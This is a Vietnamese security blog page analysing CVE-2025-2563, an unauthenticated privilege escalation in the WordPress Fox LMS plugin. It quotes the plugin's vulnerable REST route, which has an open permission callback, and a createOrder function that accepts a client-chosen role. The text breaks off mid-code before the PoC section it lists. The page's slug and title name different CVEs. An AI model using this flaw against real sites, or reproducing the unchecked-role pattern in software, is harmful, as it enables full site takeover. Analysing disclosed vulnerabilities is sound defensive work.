<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="vi">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-2563 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in WordPress Fox LMS Plugin."><meta name="keywords" content='analyst, plugin, privilege escalation'>
  <meta itemprop="name" content="CVE-2025-2563 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in WordPress Fox LMS Plugin.">
  <meta itemprop="datePublished" content="2026-01-08T19:00:00+07:00">
  <meta itemprop="dateModified" content="2026-01-08T14:55:45+07:00">
  <meta itemprop="wordCount" content="1387">
  <meta itemprop="image" content="http://localhost:1313/posts/2026-01-08-cve-2025-14156/app.png">
  <meta itemprop="keywords" content="Analyst,Plugin,Privilege Escalation"><meta property="og:url" content="http://localhost:1313/vi/posts/2026-01-08-cve-2025-14156/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2025-2563 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in WordPress Fox LMS Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2026-01-08T19:00:00+07:00">
    <meta property="article:modified_time" content="2026-01-08T14:55:45+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Privilege Escalation">
    <meta property="og:image" content="http://localhost:1313/posts/2026-01-08-cve-2025-14156/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2026-01-08-cve-2025-14156/app.png">
  <meta name="twitter:title" content="CVE-2025-2563 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress Fox LMS Plugin.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/vi/posts/2026-01-08-cve-2025-14156/" title="CVE-2025-2563 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/vi/posts/2026-01-07-cve-2025-2563/" title="CVE-2025-2563 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/vi/posts/2026-01-08-cve-2025-14156/index.md" title="CVE-2025-2563 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-2563 Analysis \u0026 POC",
    "inLanguage": "vi",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/vi\/posts\/2026-01-08-cve-2025-14156\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, privilege escalation","wordcount":  1387 ,
    "url": "http:\/\/localhost:1313\/vi\/posts\/2026-01-08-cve-2025-14156\/","datePublished": "2026-01-08T19:00:00+07:00","dateModified": "2026-01-08T14:55:45+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in WordPress Fox LMS Plugin."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" role="button" aria-label="Đổi chủ đề" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li><li class="menu-item language-switch">
            <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><a href="/posts/2026-01-08-cve-2025-14156/" class="menu-link" title="English">English</a></li><li class="menu-item"><span class="text-secondary" title="Vietnamese">Vietnamese</span></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
      <div class="theme-switch" role="button" aria-label="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Huỷ
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system"><span class="menu-system-item language-switch">
              <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ">Vietnamese<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select id="language-select" class="language-select" onchange="location = this.value;"><option value="/posts/2026-01-08-cve-2025-14156/">English</option><option value="/vi/posts/2026-01-08-cve-2025-14156/" selected disabled>Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Nội dung liên quan</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/vi/posts/2026-01-07-cve-2025-2563/" title="CVE-2025-2563 Analysis &amp; POC">CVE-2025-2563 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-06-cve-2025-7654/" title="CVE-2025-7654 Analysis &amp; POC">CVE-2025-7654 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-05-cve-2025-55707/" title="CVE-2025-53425 Analysis &amp; POC">CVE-2025-53425 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-04-cve-2025-53425/" title="CVE-2025-53425 Analysis &amp; POC">CVE-2025-53425 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-03-cve-2025-6325/" title="CVE-2025-6325 Analysis &amp; POC">CVE-2025-6325 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-02-cve-2025-11923/" title="CVE-2025-11923 Analysis &amp; POC">CVE-2025-11923 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-01-cve-2025-11749/" title="CVE-2025-11749 Analysis &amp; POC">CVE-2025-11749 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-12-31-cve-2024-13887/" title="CVE-2024-13887 Analysis &amp; POC">CVE-2024-13887 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-12-30-cve-2024-12114/" title="CVE-2024-12114 Analysis &amp; POC">CVE-2024-12114 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-12-28-cve-2025-10039/" title="CVE-2025-10039 Analysis &amp; POC">CVE-2025-10039 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-2563 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Tác giả" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;trong <a href="/vi/categories/cve-analysis/" class="post-category" title="Danh mục - CVE Analysis"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analysis</a></span></div><div class="post-meta-line"><span title="đăng ngày 2026-01-08 19:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2026-01-08">2026-01-08</time></span>&nbsp;<span title="Cập nhật ngày 2026-01-08 14:55:45"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2026-01-08">2026-01-08</time></span>&nbsp;<span title="1387 từ"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>Khoảng 1400 từ</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 phút</span>&nbsp;</div>
    </div><div class="featured-image"><img loading="eager" src='/posts/2026-01-08-cve-2025-14156/app.png' sizes="(max-width: 680px) 100vw, (max-width: 960px) 80vw, (max-width: 1440px) 56vw, 800px" alt="/posts/2026-01-08-cve-2025-14156/app.png" height="500" width="1544"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Nội dung</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#key-takeaways">Key Takeaways</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="cve--basic-info"><span>CVE &amp; Basic Info</span>
  <a href="#cve--basic-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Plugin <strong>The Fox LMS – WordPress LMS Plugin</strong> dành cho <strong>WordPress</strong> tồn tại lỗ hổng <strong>leo thang đặc quyền</strong> trong tất cả các <strong>phiên bản đến và bao gồm 1.0.5.1</strong>. Nguyên nhân là do plugin <strong>không kiểm tra và xác thực đúng tham số “role”</strong> khi <strong>tạo người dùng mới</strong> thông qua <strong>REST API endpoint <code>/fox-lms/v1/payments/create-order</code></strong>. Điều này cho phép <strong>kẻ tấn công không cần xác thực</strong> có thể <strong>tạo tài khoản người dùng mới với bất kỳ vai trò nào, bao gồm cả quản trị viên</strong>, dẫn đến <strong>toàn bộ website có thể bị chiếm quyền kiểm soát</strong>.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-2563" target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-2563</a></li>
<li><strong>Vulnerability Type</strong>: Privilege Escalation</li>
<li><strong>Affected Versions</strong>: 1.0.4.7-1.0.5.1</li>
<li><strong>Patched Versions</strong>: 1.0.5.2</li>
<li><strong>CVSS severity</strong>: High (9.8)</li>
<li><strong>Required Privilege</strong>: Unauthenticated</li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/user-registration/" target="_blank" rel="external nofollow noopener noreferrer">WordPress Fox LMS Plugin</a></li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>Local WordPress &amp; Debugging</strong>
<ul>
<li><a href="https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/" target="_blank" rel="external nofollow noopener noreferrer">Virtual Machine</a></li>
<li><a href="https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/" target="_blank" rel="external nofollow noopener noreferrer">Docker</a></li>
</ul>
</li>
<li><strong>Plugin Version</strong> - <strong>Fox LMS</strong>:
<ul>
<li><code>1.0.5.1</code> – <strong>vulnerable</strong></li>
<li><code>1.0.5.3</code> – <strong>patched</strong></li>
</ul>
</li>
<li><strong>Diff Tool (diff)</strong> → <a href="https://meldmerge.org/" target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> hoặc bất kỳ công cụ diff nào.</li>
</ul>
<div class="details admonition note open disabled">
  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-pencil-alt" aria-hidden="true"></i>Mặc dù thông tin công bố cho biết lỗ hổng đã được vá trong phiên bản <strong><code>1.0.5.2</code></strong>, nhưng trên thực tế bản vá chỉ được áp dụng đầy đủ từ phiên bản <strong><code>1.0.5.3</code></strong>.</div>
  <div class="details-content">
    <div class="admonition-content"></div>
  </div>
</div><h2 class="heading-element" id="analysis"><span>Analysis</span>
  <a href="#analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Plugin đã đăng ký một REST API như sau:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="Payments.php v1.0.5.1" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">Payments.php v1.0.5.1</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">register_rest_route</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="nx">self</span><span class="o">::</span><span class="na">getNamespace</span><span class="p">(),</span> <span class="c1">// fox-lms/v1
</span></span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getRoute</span><span class="p">(</span><span class="s1">&#39;create-order&#39;</span><span class="p">),</span> <span class="c1">// payments/create-order
</span></span></span><span class="line"><span class="cl">    <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;methods&#39;</span>             <span class="o">=&gt;</span> <span class="nx">WP_REST_Server</span><span class="o">::</span><span class="na">CREATABLE</span><span class="p">,</span> <span class="c1">// POST
</span></span></span><span class="line"><span class="cl">        <span class="s1">&#39;callback&#39;</span>            <span class="o">=&gt;</span> <span class="p">[</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;createOrder&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;permission_callback&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;__return_true&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Với cấu hình này, endpoint được public tại địa chỉ:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/wp-json/fox-lms/v1/payments/create-order</span></span></code></pre></td></tr></table></div>
</div>
</div><p>Khi có một request gửi đến endpoint trên bằng phương thức POST, WordPress sẽ tự động gọi hàm <code>createOrder()</code>. Do thiết lập <code>'permission_callback' =&gt; '__return_true'</code>, nên endpoint này không yêu cầu kiểm tra quyền truy cập. Điều đó đồng nghĩa với việc <strong>bất kỳ người dùng nào, kể cả người chưa đăng nhập, đều có thể truy cập và thực thi API này mà không gặp bất kỳ rào cản phân quyền nào</strong>.</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="Payments.php v1.0.5.1" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">Payments.php v1.0.5.1</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">createOrder</span><span class="p">(</span><span class="nx">WP_REST_Request</span> <span class="nv">$request</span><span class="p">)</span><span class="o">:</span> <span class="nx">WP_REST_Response</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$defaults</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;courseId&#39;</span>   <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;role&#39;</span>       <span class="o">=&gt;</span> <span class="s1">&#39;subscriber&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$params</span> <span class="o">=</span> <span class="nx">wp_parse_args</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_params</span><span class="p">(),</span> <span class="nv">$defaults</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">absint</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;courseId&#39;</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="k">new</span> <span class="nx">Response</span><span class="p">()</span> <span class="p">)</span><span class="o">-&gt;</span><span class="na">respond</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="nx">Fox_Lms_Checkout_Public</span><span class="o">::</span><span class="na">getPaymentError</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">errorTitle</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;Course not found&#39;</span><span class="p">,</span> <span class="s1">&#39;fox-lms&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="mi">404</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$username</span> <span class="o">=</span> <span class="nx">sanitize_user</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$email</span>    <span class="o">=</span> <span class="nx">sanitize_email</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
